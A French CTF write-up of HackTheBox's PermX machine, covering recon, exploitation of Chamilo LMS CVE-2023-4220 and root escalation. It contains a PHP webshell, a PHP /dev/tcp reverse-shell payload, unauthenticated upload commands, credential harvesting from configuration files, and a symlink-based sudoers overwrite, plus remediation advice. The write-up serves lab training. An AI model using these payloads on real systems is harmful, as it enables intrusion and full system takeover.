---
layout: post
title: "PermX - HackTheBox WriteUp"
date: 2024-09-18
categories: [CTF, HackTheBox, WriteUp]
tags: [WebApp, ChamiloLMS, CVE-2023-4220, RCE, FileUpload, PrivEsc, SudoMisconfig, ACL, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: fr
permalink: /fr/blog/2024/10/24/permx-htb-writeup/
excerpt: "Machine Linux hébergeant un Chamilo LMS vulnérable. Exploitation CVE-2023-4220 pour RCE via file upload, puis escalade de privilèges via mauvaise configuration sudo ACL."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
  <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
    <div class="flex-1">
      <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
        <i class="fas fa-cube mr-3"></i>PermX
      </h2>
      <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
        Chamilo LMS Exploitation + Sudo ACL Privilege Escalation
      </p>
    </div>
    <div class="flex gap-3">
      <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
        <i class="fas fa-circle text-xs mr-1"></i>Easy
      </span>
      <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
        <i class="fab fa-linux mr-1"></i>Linux
      </span>
    </div>
  </div>

  <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
    <div class="flex items-center gap-3">
      <div class="text-green-500 text-xl">
        <i class="fas fa-calendar"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2024-09-18</div>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <div class="text-blue-500 text-xl">
        <i class="fas fa-network-wired"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.23</div>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <div class="text-purple-500 text-xl">
        <i class="fas fa-shield-alt"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Ubuntu 22.04</div>
      </div>
    </div>

    <div class="flex items-center gap-3">
      <div class="text-amber-500 text-xl">
        <i class="fas fa-star"></i>
      </div>
      <div>
        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
      </div>
    </div>
  </div>
</div>


## 🎯 Synopsis

**PermX** est une machine <span class="text-highlight-green">**Linux de difficulté facile**</span> qui héberge un <span class="text-highlight-red">**Learning Management System (Chamilo)**</span> vulnérable à une faille de <span class="text-highlight-orange">**téléversement de fichier non restreint (CVE-2023-4220)**</span>.

L'exploitation de cette vulnérabilité permet d'obtenir un <span class="text-highlight-blue">**accès initial**</span> en tant qu'utilisateur web `www-data` via l'exécution de code à distance. L'énumération du système révèle des <span class="text-highlight-red">**credentials en clair**</span> dans le fichier de configuration Chamilo, permettant une connexion SSH avec l'utilisateur `mtz`. Enfin, l'escalade de privilèges se fait via l'exploitation d'une <span class="text-highlight-purple">**mauvaise configuration sudo**</span> sur un script `acl.sh` utilisant des liens symboliques, conduisant à un <span class="text-highlight-green">**shell root**</span>.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Compétences requises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Utilisation du terminal Linux</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Énumération web et DNS (subdomain fuzzing)</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Analyse des configurations système</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Compréhension des permissions Linux</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Compétences acquises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation de CMS (Chamilo LMS)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>File Upload RCE (CVE-2023-4220)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation de configuration sudo</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Manipulation de liens symboliques pour PrivEsc</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Reconnaissance réseau

### Scan de ports initial

On commence par un scan rapide de tous les ports TCP pour identifier les services exposés :

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23
```

### Énumération détaillée des services

Une fois les ports ouverts identifiés, on effectue un scan approfondi avec détection de version et scripts NSE :

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.23
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Résultats du scan
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.9p1 Ubuntu</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Service d'administration à distance sécurisé</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.52</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Serveur web hébergeant l'application cible</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Point d'entrée identifié :</strong> Le service web sur le port 80 constitue le vecteur d'attaque initial le plus probable. Le site redirige vers permx.htb.
    </p>
</div>


## 🌐 Phase 2 — Énumération web et virtual hosts

### Découverte du domaine principal

En visitant `http://10.10.11.23`, le site redirige vers `permx.htb`. On l'ajoute au fichier `/etc/hosts` :

```bash
echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts
```

### Fuzzing de sous-domaines

Le fuzzing du header `Host` permet de découvrir des virtual hosts additionnels hébergés sur le même serveur :

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://permx.htb/ \
     -H 'Host: FUZZ.permx.htb' \
     -t 200 -ic -fw 18
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Sous-domaines découverts :</strong> 
        <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono mx-1">www.permx.htb</code>
        <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono mx-1">lms.permx.htb</code>
    </p>
</div>

On ajoute ces sous-domaines à `/etc/hosts` :

```bash
echo "10.10.11.23 www.permx.htb lms.permx.htb" | sudo tee -a /etc/hosts
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Technique clé :</strong> Le fuzzing du header <code>Host</code> est une méthode d'énumération essentielle pour découvrir des virtual hosts non répertoriés dans les enregistrements DNS publics.
    </p>
</div>

## 💼 Phase 3 — Initial Access via Chamilo LMS

### Identification de l'application

En accédant à `http://lms.permx.htb/`, on découvre une installation de **Chamilo LMS**, un système de gestion de l'apprentissage open-source.

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-blue-500">
    <div class="flex items-start gap-4 mb-4">
        <div class="text-4xl text-blue-500">
            <i class="fas fa-graduation-cap"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">Chamilo LMS</h4>
            <p class="text-gray-600 dark:text-gray-400">Learning Management System open-source</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        Chamilo est une plateforme d'apprentissage en ligne largement utilisée dans les établissements d'enseignement.
    </p>
</div>

### Recherche de vulnérabilités

Une recherche rapide révèle la vulnérabilité <span class="text-highlight-orange">**CVE-2023-4220**</span>, permettant un **upload non authentifié de fichiers** via le script `bigUpload.php`.


## ⚙️ Phase 4 — Exploitation CVE-2023-4220

### Analyse de la vulnérabilité

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2023-4220 - File Upload RCE
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Application affectée :</span> Chamilo LMS
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type :</span> Remote Code Execution (RCE)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score :</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description :</span><br>
            Le script <code>bigUpload.php</code> ne valide pas correctement le nom des fichiers envoyés. Un attaquant peut donc téléverser un fichier <code>.php</code> malveillant et exécuter des commandes arbitraires côté serveur sans authentification.
        </div>
    </div>
</div>

### Proof of Concept

**Génération du webshell :**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Téléversement via cURL :**

```bash
curl -F 'bigUploadFile=@shell.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Résultat :</strong> File uploaded successfully
    </p>
</div>

**Vérification du fonctionnement :**

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=id'
```

Sortie :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Shell confirmé en tant que www-data!
    </p>
</div>

### Obtention d'un reverse shell

**Démarrage du listener sur la machine attaquante :**

```bash
nc -lnvp 4455
```

**Création du payload de reverse shell :**

```bash
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.12/4455 0>&1'\''"); ?>' > rev.php
```

**Téléversement du payload :**

```bash
curl -F 'bigUploadFile=@rev.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

**Exécution du reverse shell :**

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Connexion établie → shell www-data obtenu!
    </p>
</div>

## 🔧 Phase 5 — Stabilisation du shell et énumération

### Amélioration du shell

Stabilisation du shell pour une meilleure interactivité :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 160
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Astuce :</strong> Cette technique permet d'obtenir un shell interactif complet avec historique des commandes et auto-complétion.
    </p>
</div>

### Énumération des fichiers de configuration

Les applications web stockent souvent des credentials dans leurs fichiers de configuration. On examine le fichier de configuration de Chamilo :

```bash
cat /var/www/chamilo/app/config/configuration.php
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
    <h4 class="text-xl font-bold mb-3 text-green-600 dark:text-green-400 flex items-center">
        <i class="fas fa-key mr-2"></i>Credentials découverts
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-3 rounded font-mono text-sm">
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">$_configuration['db_user']</span> = <span class="text-green-600 dark:text-green-400">'chamilo'</span>;<br>
            <span class="text-blue-600 dark:text-blue-400">$_configuration['db_password']</span> = <span class="text-green-600 dark:text-green-400">'03F6lY3uXAP2bkW8'</span>;
        </div>
    </div>
</div>

### Identification des utilisateurs système

Vérification des utilisateurs locaux avec un shell :

```bash
cat /etc/passwd | grep '/bin/bash'
```

**Résultat :** L'utilisateur `mtz` a accès shell.

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Credentials en clair trouvés !</strong> Ces identifiants sont potentiellement réutilisés ailleurs sur le système.
    </p>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Technique :</strong> Les fichiers de configuration d'applications web sont une mine d'or pour le pivoting — ils contiennent souvent des credentials valides réutilisés sur le système.
    </p>
</div>


## 🔐 Phase 6 — Accès SSH et user flag

### Connexion SSH

Tentative de connexion SSH avec le mot de passe découvert :

```bash
ssh mtz@permx.htb
```

**Mot de passe :** `03F6lY3uXAP2bkW8`

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Connexion SSH réussie!
    </p>
</div>

### Validation de l'accès

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(mtz) gid=1000(mtz) groups=1000(mtz)
    </div>
</div>

### Récupération du user flag

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>USER FLAG OBTENU !</strong> Première étape complétée.
    </p>
</div>

## 🔍 Phase 7 — Vérification des privilèges sudo

### Analyse des droits sudo

Vérification des commandes que `mtz` peut exécuter avec sudo :

```bash
sudo -l
```

<div class="bg-red-50 dark:bg-red-900/20 p-5 rounded-xl shadow-lg my-4 border-l-4 border-red-500">
    <h4 class="text-xl font-bold mb-3 text-red-600 dark:text-red-400 flex items-center">
        <i class="fas fa-exclamation-triangle mr-2"></i>Configuration Sudo détectée
    </h4>
    <div class="bg-red-100 dark:bg-red-800/30 p-3 rounded font-mono text-sm">
        <div class="text-red-600 dark:text-red-400">
            (ALL : ALL) NOPASSWD: /opt/acl.sh
        </div>
    </div>
</div>

<div class="bg-red-100 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4 rounded-r-lg">
    <p class="text-red-800 dark:text-red-200">
        <i class="fas fa-search mr-2 text-red-500"></i>
        <strong>Vecteur d'escalade identifié :</strong> L'utilisateur <code>mtz</code> peut exécuter <code>/opt/acl.sh</code> en tant que n'importe quel utilisateur <strong>sans mot de passe</strong>.
    </p>
</div>

### Analyse du script /opt/acl.sh

Examen du contenu du script :

```bash
cat /opt/acl.sh
```

```bash
#!/bin/bash
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    echo "Access denied."
    exit 1
fi

if [ ! -f "$target" ]; then
    echo "Target must be a file."
    exit 1
fi

sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

**Analyse du script :**

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-purple-500">
    <h4 class="text-xl font-bold mb-4 text-purple-600 dark:text-purple-400 flex items-center">
        <i class="fas fa-code mr-2"></i>Analyse de vulnérabilité
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li><i class="fas fa-check text-green-500 mr-2"></i>Le script vérifie que le fichier ciblé est dans <code>/home/mtz/</code></li>
        <li><i class="fas fa-check text-green-500 mr-2"></i>Applique des permissions ACL à ce fichier</li>
        <li><i class="fas fa-check text-green-500 mr-2"></i>Exécuté avec <code>sudo</code>, donc <strong>root</strong> contrôle <code>setfacl</code></li>
        <li><i class="fas fa-exclamation-triangle text-red-500 mr-2"></i><strong>Vulnérabilité :</strong> Aucune vérification des liens symboliques !</li>
    </ul>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-lightbulb mr-2 text-amber-500"></i>
        <strong>Exploitation possible :</strong> En créant un <strong>lien symbolique</strong> dans <code>/home/mtz</code> pointant vers un fichier système (comme <code>/etc/sudoers</code>), on peut contourner la restriction et modifier des fichiers systèmes critiques.
    </p>
</div>


## 👑 Phase 8 — Escalade de privilèges via liens symboliques

### Stratégie d'exploitation

La vulnérabilité du script `acl.sh` réside dans l'absence de vérification des liens symboliques. Nous allons :

1. Créer un lien symbolique dans `/home/mtz` pointant vers `/etc/sudoers`
2. Utiliser le script pour donner les permissions d'écriture via ACL
3. Modifier `/etc/sudoers` pour obtenir un accès root complet

### Exploitation

**Création du lien symbolique :**

```bash
ln -s /etc/sudoers /home/mtz/root
```

**Application des permissions ACL via le script vulnérable :**

```bash
sudo /opt/acl.sh mtz rw /home/mtz/root
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Succès :</strong> Les permissions ACL sont maintenant appliquées au fichier <code>/etc/sudoers</code> via le lien symbolique !
    </p>
</div>

**Modification du fichier sudoers :**

```bash
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
```

**Vérification de la modification :**

```bash
cat /etc/sudoers | tail -1
```

**Élévation vers root :**

```bash
sudo bash
```

### Résultat de l'exploitation

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=0(root) gid=0(root) groups=0(root)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        <strong>ROOT SHELL OBTENU !</strong> Privilèges maximum atteints.
    </p>
</div>

## 🏁 Phase 9 — Extraction des flags

### Récupération du root flag

Avec l'accès root, nous pouvons maintenant récupérer le root flag :

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> /home/mtz/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>

## 📋 Phase 10 — Recommandations et remédiations

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-start">
            <i class="fas fa-globe mr-2 mt-1"></i><span>Application</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Mettre à jour Chamilo pour corriger CVE-2023-4220</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Sécuriser les credentials (chiffrement, vault)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Valider les extensions et MIME types pour les uploads</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Isoler les fichiers de configuration sensibles</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-start">
            <i class="fas fa-server mr-2 mt-1"></i><span>Système</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Limiter l'accès aux scripts sudo — ne jamais autoriser des scripts manipulant des fichiers à des utilisateurs non root</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Vérifier les liens symboliques dans les scripts sudo</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Auditer régulièrement les configurations sudo (<code>sudo -l</code>)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Surveiller les modifications de fichiers système critiques</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Récapitulatif des commandes

### 🔍 Phase 1 : Reconnaissance réseau

```bash
# 1. Scan rapide de tous les ports
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23

# 2. Scan détaillé des ports ouverts
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.23
# → Ports 22 (SSH) et 80 (HTTP) ouverts
```

### 🌐 Phase 2 : Énumération web

```bash
# 1. Configuration DNS
echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts

# 2. Fuzzing de sous-domaines (Host header)
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -t 200 -ic -fw 18
# → Découverte de lms.permx.htb (Chamilo LMS)

# 3. Ajouter le sous-domaine
echo "10.10.11.23 lms.permx.htb" | sudo tee -a /etc/hosts
```

### 💥 Phase 3 : Exploitation Chamilo (CVE-2023-4220)

```bash
# 1. Créer un webshell PHP simple
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload via la vulnérabilité bigUpload
curl -F 'bigUploadFile=@shell.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
# → shell.php uploadé dans /files/

# 3. Tester le webshell
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=id'
# → Confirmation d'exécution de code
```

### 🔄 Phase 4 : Reverse shell

```bash
# 1. Démarrer un listener
nc -lnvp 4455

# 2. Créer un reverse shell PHP
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.12/4455 0>&1'\''"); ?>' > rev.php

# 3. Upload du reverse shell
curl -F 'bigUploadFile=@rev.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'

# 4. Déclencher le reverse shell
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
# → Shell www-data obtenu !

# 5. Stabilisation du shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# (Ctrl+Z puis)
stty raw -echo; fg
stty rows 38 columns 160
```

### 🔑 Phase 5 : Pivoting vers mtz

```bash
# 1. Énumération des fichiers de configuration Chamilo
cat /var/www/chamilo/app/config/configuration.php
# → Trouve les credentials MySQL : mtz / 03F6lY3uXAP2bkW8

# 2. Test de réutilisation du mot de passe pour SSH
ssh mtz@permx.htb
# Password: 03F6lY3uXAP2bkW8
# → Connexion réussie !

# 3. Récupération du user flag
cat ~/user.txt
```

### 👑 Phase 6 : Escalade de privilèges (Sudo ACL)

```bash
# 1. Vérifier les permissions sudo
sudo -l
# → (ALL : ALL) NOPASSWD: /opt/acl.sh

# 2. Analyser le script acl.sh
cat /opt/acl.sh
# → Script qui modifie les ACL avec setfacl

# 3. Créer un lien symbolique vers /etc/sudoers
ln -s /etc/sudoers /home/mtz/root

# 4. Donner les permissions d'écriture via le script
sudo /opt/acl.sh mtz rw /home/mtz/root
# → ACL modifiées pour écrire dans /etc/sudoers !

# 5. S'ajouter dans sudoers
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root

# 6. Obtenir un shell root
sudo bash
# → Root shell obtenu !

# 7. Récupération du root flag
cat /root/root.txt
```

---

## 🔗 Chaîne d'attaque résumée

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-project-diagram mr-2"></i>Parcours d'attaque complet
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et énumération</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → permx.htb → ffuf → lms.permx.htb</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Exploitation et accès initial</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2023-4220 → File Upload RCE → www-data shell</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Énumération et pivoting</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">configuration.php → plaintext creds → SSH mtz</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Sudo acl.sh → Symbolic link → /etc/sudoers → Root shell</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & Références

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WebApp</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ChamiloLMS</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2023-4220</span>
